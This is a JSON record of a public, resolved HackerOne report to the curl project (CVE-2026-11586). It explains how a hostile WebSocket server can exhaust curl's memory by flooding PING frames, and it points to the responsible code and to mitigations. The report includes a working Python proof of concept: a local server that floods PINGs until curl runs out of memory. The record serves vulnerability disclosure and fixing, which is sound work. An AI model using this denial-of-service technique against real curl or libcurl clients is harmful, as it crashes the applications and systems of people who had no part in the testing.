@@ -1,0 +1,113 @@
+{
+  "id": 3788931,
+  "global_id": "Z2lkOi8vaGFja2Vyb25lL1JlcG9ydC8zNzg4OTMx",
+  "url": "https://hackerone.com/reports/3788931",
+  "title": "CVE-2026-11586: WS Auto-PONG memory exhaustion",
+  "state": "Closed",
+  "substate": "resolved",
+  "severity_rating": "low",
+  "readable_substate": "Resolved",
+  "created_at": "2026-06-08T07:54:48.687Z",
+  "submitted_at": "2026-06-08T07:54:49.073Z",
+  "is_member_of_team?": false,
+  "is_organization_group_member?": false,
+  "is_triager?": false,
+  "reporter": {
+    "disabled": false,
+    "username": "evergarden1123",
+    "url": "/evergarden1123",
+    "profile_picture_urls": {
+      "small": "/assets/avatars/default-14ffa99f59cd01423c64904352cc130ffcb6a802eadfd11777a54485749e60f2.png"
+    },
+    "is_me?": false,
+    "cleared": false,
+    "verified": false,
+    "hackerone_triager": false,
+    "hacker_mediation": false
+  },
+  "team": {
+    "id": 35663,
+    "url": "https://hackerone.com/curl",
+    "handle": "curl",
+    "profile_picture_urls": {
+      "small": "https://profile-photos.hackerone-user-content.com/variants/000/035/663/2faf4c279d437d64bfda6d23d62ce1833813a4d9_original.png/b8e19a7691128fca51630d7f5b14644b91b3b45324f6fd488e36244d744fe35b",
+      "medium": "https://profile-photos.hackerone-user-content.com/variants/000/035/663/2faf4c279d437d64bfda6d23d62ce1833813a4d9_original.png/89f037b490baf3dcca1b84283f4c85141b64c213252a9c79b56c62bf903ab542"
+    },
+    "permissions": [],
+    "submission_state": "open",
+    "default_currency": "usd",
+    "awards_miles": false,
+    "offers_bounties": false,
+    "state": "public_mode",
+    "only_cleared_hackers": false,
+    "pentest_feature_enabled?": false,
+    "pentest_retesting_ends_at": null,
+    "profile": {
+      "name": "curl",
+      "twitter_handle": "",
+      "website": "https://curl.se",
+      "about": "cURL is an Open Source project providing a library and command-line tool doing internet transfers"
+    }
+  },
+  "has_bounty?": false,
+  "can_view_team": true,
+  "can_view_report": true,
+  "is_external_bug": false,
+  "is_published": false,
+  "is_participant": false,
+  "has_collaborators": false,
+  "submitted_by_team_member": false,
+  "submitted_with_assistant": false,
+  "stage": 4,
+  "public": true,
+  "visibility": "full",
+  "cve_ids": [
+    "CVE-2026-11586"
+  ],
+  "singular_disclosure_disabled": true,
+  "disclosed_at": "2026-06-24T08:29:15.635Z",
+  "bug_reporter_agreed_on_going_public_at": null,
+  "team_member_agreed_on_going_public_at": "2026-06-24T06:14:41.183Z",
+  "comments_closed?": false,
+  "facebook_team?": false,
+  "team_private?": false,
+  "vulnerability_information": "## Summary:\nTL;DR: a remote WebSocket peer can make default curl/libcurl grow memory until timeout or OOM by sending legal `PING` frames while refusing to read the client's automatic `PONG`s.\n\n\n\n\ncurl automatically replies to each received WebSocket `PING` with a `PONG` unless `CURLWS_NOAUTOPONG` is set. In `lib/ws.c`, `ws_enc_add_cntrl()` queues the generated `PONG` into `ws->sendbuf` and ignores the result of `ws_flush()`, while `ws->sendbuf` is initialized with `BUFQ_OPT_SOFT_LIMIT`. A malicious WebSocket peer can complete a valid upgrade, stop reading client data, and keep sending legal `PING` frames so curl continues appending internal `PONG`s without an effective hard limit. This is not just a never-ending transfer: even with `--max-time 8`, the default CLI path can hit `1 GiB` RSS in about 2 seconds locally, and under a 180 MiB address-space limit it exits with `curl: (27) Out of memory`. The same input with `CURLWS_NOAUTOPONG` does not show comparable memory growth. As a temporary mitigation, a smaller `--max-time` / `CURLOPT_TIMEOUT` reduces the attack window, while `CURLWS_NOAUTOPONG` avoids this default auto-PONG queueing path entirely.\n\n## Affected version\nReproduced on current local build:\n\n```text\ncurl 8.21.0-DEV (Linux) libcurl/8.21.0-DEV zlib/1.2.11 libpsl/0.21.0 nghttp2/1.40.0\nRelease-Date: [unreleased]\nProtocols: dict file ftp gopher http imap ipfs ipns mqtt pop3 rtsp smtp telnet tftp ws\nFeatures: alt-svc AsynchDNS HTTP2 IPv6 Largefile libz PSL threadsafe UnixSockets\n```\n\nPreliminary version triage:\n\n- Current `master` / `8.21.0-DEV` reproduces.\n- The vulnerable auto-PONG queueing path appears to have been introduced by commit `0b09132877` (`websocket: handling of PONG frames`).\n- Based on tag containment, the first released version that appears to contain this specific path is `8.16.0`.\n- Initial review suggests `8.15.x` and earlier do not contain this same queued auto-PONG implementation.\n\nRelevant code paths:\n\n```c\n/* lib/ws.c */\nif(!ws->enc.payload_remain) {\n  CURLcode result = ws_enc_add_pending(data, ws);\n  if(!result)\n    (void)ws_flush(data, ws, Curl_is_in_callback(data));\n  return result;\n}\n\n/* sendbuf uses BUFQ_OPT_SOFT_LIMIT */\nCurl_bufq_init2(&ws->sendbuf, chunk_size, WS_CHUNK_COUNT, BUFQ_OPT_SOFT_LIMIT);\n```\n\n## Steps To Reproduce:\nFrom a curl source checkout with a WebSocket-enabled build, run this single self-contained PoC. It does not call any repository-local PoC file.\n\n```bash\nCURL_BIN=\"${CURL_BIN:-./build-codex-h2-nosan/src/curl}\" python3 - <<'PY'\nimport base64, hashlib, os, re, resource, socket, subprocess, threading, time\nst = {}\n\ndef srv():\n    s = socket.socket()\n    s.setsockopt(socket.SOL_SOCKET, socket.SO_REUSEADDR, 1)\n    s.bind((\"127.0.0.1\", 0))\n    s.listen(1)\n    st[\"p\"] = s.getsockname()[1]\n\n    c, _ = s.accept()\n    c.setsockopt(socket.SOL_SOCKET, socket.SO_RCVBUF, 4096)\n    req = b\"\"\n    while b\"\\r\\n\\r\\n\" not in req:\n        req += c.recv(4096)\n\n    k = re.search(rb\"(?im)^Sec-WebSocket-Key:\\s*(\\S+)\", req).group(1)\n    a = base64.b64encode(\n        hashlib.sha1(k + b\"258EAFA5-E914-47DA-95CA-C5AB0DC85B11\").digest()\n    ).decode()\n    c.sendall(\n        (\n            \"HTTP/1.1 101 Switching Protocols\\r\\n\"\n            \"Upgrade: websocket\\r\\n\"\n            \"Connection: Upgrade\\r\\n\"\n            f\"Sec-WebSocket-Accept: {a}\\r\\n\\r\\n\"\n        ).encode()\n    )\n\n    f = b\"\\x89\\x00\" * 65536\n    try:\n        while True:\n            c.sendall(f)\n    except OSError:\n        pass\n\nthreading.Thread(target=srv, daemon=True).start()\nwhile \"p\" not in st:\n    time.sleep(0.01)\n\nrc = subprocess.run(\n    [\n        os.environ[\"CURL_BIN\"],\n        \"--silent\",\n        \"--show-error\",\n        \"--max-time\",\n        \"8\",\n        f\"ws://127.0.0.1:{st['p']}/\",\n    ],\n    preexec_fn=lambda: resource.setrlimit(\n        resource.RLIMIT_AS, (188743680, 188743680)\n    ),\n).returncode\n\nprint(\"curl rc =\", rc)\nPY\n```\n\nExpected result:\n\n```text\ncurl: (27) Out of memory\ncurl rc = 27\n```\n\nFor comparison, a `CURLOPT_WS_OPTIONS = CURLWS_NOAUTOPONG` control client processed the same empty-`PING` input without comparable memory growth, and a bounded-time CLI validation reached about `1.05 GiB` RSS in about `1.96` seconds before the verifier stopped it.\n\nPractical mitigation today:\n\n- Set a smaller `--max-time` / `CURLOPT_TIMEOUT` if the WebSocket transfer does not need to stay open long. This only limits how much memory can be forced before timeout.\n- Set `CURLWS_NOAUTOPONG` if the application can safely handle WebSocket `PING` frames itself. This avoids the vulnerable default auto-PONG path.\n\n## Impact\n\n## Summary:\nA remote WebSocket peer can drive unbounded growth of curl's internal auto-PONG send queue and exhaust the client process memory budget using only legal protocol input after a valid handshake. Depending on available memory and runtime limits, this can terminate the curl command-line tool with `CURLE_OUT_OF_MEMORY`, trigger system/container OOM handling, or cause a libcurl-using application to fail. The issue affects default WebSocket behavior and does not require API misuse, local access, or malformed frames. Smaller timeout values can reduce the damage window, but they do not add backpressure; disabling auto-PONG with `CURLWS_NOAUTOPONG` avoids this specific path.",
+  "weakness": {
+    "id": 120,
+    "name": "Allocation of Resources Without Limits or Throttling"
+  },
+  "original_report_id": null,
+  "original_report_url": null,
+  "attachments": [],
+  "allow_singular_disclosure_at": null,
+  "vote_count": 0,
+  "voters": [],
+  "severity": {
+    "rating": "low",
+    "author_type": "User"
+  },
+  "structured_scope": {
+    "databaseId": 18844,
+    "asset_type": "SOURCE_CODE",
+    "asset_identifier": "https://github.com/curl/curl",
+    "max_severity": "critical"
+  },
+  "abilities": {
+    "assignable_team_members": [],
+    "assignable_team_member_groups": []
+  },
+  "is_exploit_agent_supported?": false,
+  "is_linear_agent_ui_supported?": false,
+  "summaries": [
+    {
+      "category": "team",
+      "can_view?": true,
+      "can_create?": false
+    },
+    {
+      "category": "researcher",
+      "can_view?": true,
+      "can_create?": false
+    }
+  ]
+}
